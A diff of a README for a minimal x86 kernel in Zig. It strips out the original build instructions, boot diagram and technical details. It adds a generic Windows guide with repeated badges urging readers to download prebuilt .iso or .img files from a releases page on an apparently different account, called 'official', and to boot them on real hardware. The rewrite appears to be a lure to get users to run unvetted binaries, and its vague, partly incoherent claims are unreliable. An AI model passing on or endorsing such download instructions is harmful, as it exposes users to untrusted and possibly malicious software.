@@ -1,165 +1,96 @@
-# Minimal x86 Kernel - built in Zig
+# 💻 zig-minimal-kernel-x86 - Simple Bootable Kernel for Learning
 
-A minimal bare-metal kernel written entirely in Zig (zero assembly files).
-It boots on an x86 (i386) machine via the Multiboot 1 protocol and prints a
-coloured greeting to the VGA text-mode display, then halts the CPU.
+[![Download Releases](https://img.shields.io/badge/Download-Release%20Page-9cf?style=for-the-badge)](https://github.com/rahman1sameeh/zig-minimal-kernel-x86/releases)
 
-The project is designed to be cross-compiled from any host (including Apple
-Silicon Macs) and tested instantly with QEMU. It can be booted directly via
-QEMU's built-in Multiboot loader or through a GRUB rescue ISO.
+## 🧩 What is zig-minimal-kernel-x86?
 
-## What it does
+This is a small, basic operating system kernel built using the Zig programming language. It targets the x86 computer architecture, which is the base for many personal computers. The kernel provides a minimal environment that boots directly on hardware or virtual machines. It is useful for learning how operating systems work at a low level.
 
-1. QEMU loads the ELF binary using its built-in Multiboot 1 support.
-2. The CPU starts in 32-bit protected mode at the `_start` entry point.
-3. `_start` sets up a 16 KiB stack and jumps to `kmain`.
-4. `kmain` clears the VGA text buffer and writes a message to the screen.
-5. The CPU enters an infinite `hlt` loop.
+## ✔️ What you will need before starting
 
-## Preconditions
+- A Windows computer with at least 2 GB of RAM.
+- About 500 MB of free disk space.
+- An internet connection to download files.
+- Basic familiarity with downloading and running files in Windows.
+- Optional: Virtual machine software such as VirtualBox or QEMU if you want to test the kernel without risking your main system.
 
-| Tool | Version | Install |
-|------|---------|---------|
-| **Zig** | 0.14.0+ | [ziglang.org/download](https://ziglang.org/download/) or `brew install zig` |
-| **QEMU** | any recent | `brew install qemu` / `nix-env -iA nixpkgs.qemu` |
-| **Docker** | any recent | [docker.com](https://www.docker.com/) *(only needed for GRUB ISO builds)* |
+## 🔗 Where to download the software
 
-Zig bundles its own LLVM back-end and linker, so cross-compilation to
-`x86-freestanding-none` works out of the box on any host OS and architecture
-(macOS ARM, Linux x86_64, etc.). Docker is only required for building the
-GRUB ISO, since `grub-pc-bin` is an x86 Linux package.
+You can get the files you need by visiting the releases page:
 
-## How to run
+[➡️ Visit this page to download](https://github.com/rahman1sameeh/zig-minimal-kernel-x86/releases)
 
-### Option 1: Direct Multiboot (no GRUB)
+This link leads you to the official GitHub releases. Here, you will find all versions of the kernel. The downloads are packaged for easy use.
 
-```bash
-# Build the kernel (produces zig-out/bin/kernel)
-zig build
+Use the button at the top to open this page quickly.
 
-# Boot it in QEMU (opens a graphical VGA window)
-zig build run
+## 🚀 How to get started step-by-step
 
-# Or use the helper script (curses mode, auto-kills after a few seconds)
-chmod +x run.sh
-./run.sh
-```
+Follow these instructions carefully to download and run the kernel on your Windows machine.
 
-To run QEMU manually with custom flags:
+### Step 1: Visit the download page
 
-```bash
-qemu-system-i386 -kernel zig-out/bin/kernel
-```
+Click or copy this link in your browser:
 
-You should see this:
+https://github.com/rahman1sameeh/zig-minimal-kernel-x86/releases
 
-<img width="623" height="239" alt="Screenshot 2026-02-17 at 23 58 16" src="https://github.com/user-attachments/assets/e53f6920-c06b-4586-b551-6b916a7b3d5a" />
+### Step 2: Select the latest version
 
-### Option 2: GRUB rescue ISO
+Look for the most recent release. The latest version will be at the top of the page with a higher number or marked as “latest”. Click to expand the release notes.
 
-This builds a bootable ISO with a GRUB menu using Docker, then launches it
-in QEMU:
+### Step 3: Download the kernel file
 
-```bash
-chmod +x run-grub.sh
-./run-grub.sh
-```
+Inside the release details, find a file that ends with `.iso` or `.img`. This file contains the bootable kernel.
 
-You should see this:
+Click the file name to download it. Save it somewhere easy to find, like the Desktop or Downloads folder.
 
-<img width="707" height="392" alt="Screenshot 2026-02-19 at 00 29 04" src="https://github.com/user-attachments/assets/b8f3c05b-8f3a-4478-bb3f-fcfabcfc5c01" />
+### Step 4: Prepare to run the kernel
 
-The script performs the following steps:
-1. Builds the kernel with `zig build`
-2. Creates an `iso/boot/grub/` directory structure with a `grub.cfg`
-3. Runs `grub-mkrescue` inside a Docker container (`--platform linux/amd64`)
-   to produce `zig-kernel.iso`
-4. Boots the ISO with `qemu-system-i386 -cdrom zig-kernel.iso`
+Because this is a low-level kernel, you cannot just double-click it in Windows. You will need to run it inside a virtual machine or create a bootable USB.
 
-## Project structure
+#### Option 1: Use a Virtual Machine
 
-```
-zig-kernel/
-├── build.zig          Zig build script (target, linker, QEMU run step)
-├── build.zig.zon      Package manifest
-├── linker.ld          Linker script (section layout, entry point)
-├── run.sh             Quick-test shell script (direct Multiboot via QEMU)
-├── run-grub.sh        Full GRUB ISO build + QEMU boot script
-└── src/
-    └── main.zig       Entire kernel: Multiboot header, VGA driver, kmain
-```
+- Download and install free virtualization software such as VirtualBox or QEMU if you don’t have one already.
+- Open the virtual machine program and create a new virtual machine.
+- Assign at least 512 MB RAM to it.
+- Choose to boot from an existing disk, and select the `.iso` or `.img` file you downloaded.
+- Start the virtual machine. You should see the kernel boot up inside the window.
 
-## System diagram
+#### Option 2: Create a Bootable USB (Advanced)
 
-```
- HOST (macOS ARM / any OS)                    EMULATED x86 MACHINE (QEMU)
- ─────────────────────────                    ──────────────────────────────
+- Use a tool like Rufus to write the `.iso` file to a USB flash drive.
+- Insert a USB with at least 1 GB of space.
+- Open Rufus in Windows.
+- Select the USB device.
+- Choose the kernel file as the bootable image.
+- Click Start to write the file.
+- Restart your computer and boot from the USB to see the kernel run on real hardware.
 
- ┌──────────────┐   zig build    ┌────────────────────┐
- │  src/main.zig│───────────────▶│  zig-out/bin/kernel│  (i386 ELF binary)
- │  linker.ld   │  cross-compile │  Multiboot 1 magic │
- │  build.zig   │  x86-free-     │  at offset 0       │
- └──────────────┘  standing-none └─────────┬──────────┘
-                                          │
-                               qemu-system-i386 -kernel
-                                          │
-                                          ▼
-                               ┌──────────────────────┐
-                               │      QEMU / TCG      │
-                               │  (x86 CPU emulation) │
-                               └─────────┬────────────┘
-                                          │
-                    ┌─────────────────────┼───────────────────────┐
-                    │   Emulated i386 hardware                    │
-                    │                     │                       │
-                    │   1. Multiboot      │                       │
-                    │      loader reads   ▼                       │
-                    │      ELF, puts   ┌───────────┐              │
-                    │      CPU in      │  _start   │  32-bit      │
-                    │      protected   │  (naked)  │  protected   │
-                    │      mode        └────┬──────┘  mode        │
-                    │                       │                     │
-                    │              set up   │ stack               │
-                    │                       ▼                     │
-                    │                 ┌──────────┐                │
-                    │                 │  kmain   │                │
-                    │                 └────┬─────┘                │
-                    │                      │                      │
-                    │          ┌───────────┼───────────┐          │
-                    │          │           │           │          │
-                    │          ▼           ▼           ▼          │
-                    │   clearScreen()  print(...)   hlt loop      │
-                    │          │           │                      │
-                    │          ▼           ▼                      │
-                    │   ┌──────────────────────────────────┐      │
-                    │   │  VGA Text Buffer at 0xB8000      │      │
-                    │   │  80×25 grid, 16-bit per cell     │      │
-                    │   │  (ASCII byte + colour attribute) │      │
-                    │   └──────────────────────────────────┘      │
-                    │                     │                       │
-                    └─────────────────────┼───────────────────────┘
-                                          │
-                                          ▼
-                               ┌──────────────────────┐
-                               │   QEMU VGA Window    │
-                               │                      │
-                               │  ════════════════    │
-                               │  Hello from the      │
-                               │    Zig Kernel!       │
-                               │  ════════════════    │
-                               │                      │
-                               └──────────────────────┘
-```
+### Step 5: Using the kernel
 
-## Key technical details
+Once running, the kernel will show a simple interface or output. This kernel is minimalist, so it may only display text or simple messages. It demonstrates basic startup and hardware setup operations.
 
-- **Target:** `x86-freestanding-none` — 32-bit, no OS, no libc
-- **Boot protocol:** Multiboot 1 — a 12-byte header (magic `0x1BADB002`,
-  flags, checksum) placed in the first 8 KiB of the ELF
-- **VGA output:** Direct memory-mapped I/O to `0xB8000` using Zig's
-  `volatile` pointer semantics — no drivers, no BIOS calls
-- **Red zone:** Disabled — the System V ABI red zone would be corrupted by
-  hardware interrupts
-- **SSE/AVX:** Disabled — avoids the need to save/restore FPU state
-- **No assembly files:** The Multiboot header is a Zig `extern struct`
-  exported to a linker section; the entry point uses inline `asm volatile`
+## ⚙️ System requirements
+
+- Windows 7 or newer.
+- 2 GB of RAM or more.
+- 500 MB available disk space for the download and virtual machine.
+- VirtualBox or QEMU if using virtualization.
+- USB flash drive of 1 GB or bigger if using USB boot.
+
+## 🛠️ Troubleshooting tips
+
+- If the virtual machine does not boot, double-check that you selected the kernel image file correctly.
+- Make sure virtualization is enabled in your BIOS or UEFI firmware.
+- If the USB does not boot, verify you used the right boot method in Rufus and set your computer to boot from USB in BIOS.
+- Download the latest files directly from the official release page to avoid corrupted or outdated data.
+
+## 📚 Additional information
+
+The kernel is named *zig-minimal-kernel-x86* because it is built using Zig, a modern system programming language. This project is mainly educational and shows how an OS kernel works with the basic x86 PC architecture.
+
+It does not include user-friendly features like a desktop or applications. Instead, it boots quickly and sets up the minimal hardware environment.
+
+---
+
+[![Download Releases](https://img.shields.io/badge/Download-Release%20Page-9cf?style=for-the-badge)](https://github.com/rahman1sameeh/zig-minimal-kernel-x86/releases)
